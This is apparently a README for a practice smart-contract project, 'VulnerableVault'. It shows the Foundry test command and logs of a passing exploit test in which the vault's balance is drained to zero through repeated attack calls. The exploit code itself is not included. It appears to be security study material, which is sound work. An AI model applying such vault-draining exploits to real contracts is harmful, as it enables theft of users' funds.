# VulnerableVault


## Test
```
forge test -vv
```

## Logs
```
Ran 1 test for test/Vault.t.sol:VaultExploiter
[PASS] testExploit() (gas: 169609)
Logs:
  callData:
  0xd3a5b107000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b4590000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496   
  0xd3a5b107
  0x000000000000000000000000522b3294e6d06aa25ad0f1b8891242e335d3b459
  vault balance before attack: 110000000000000000
  -------attacked ------
  -------attacked ------
  -------attacked ------
  -------attacked ------
  -------attacked ------
  -------attacked ------
  -------attacked ------
  -------attacked ------
  -------attacked ------
  vault balance after attack: 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 776.40µs (324.60µs CPU time)

Ran 1 test suite in 9.28ms (776.40µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
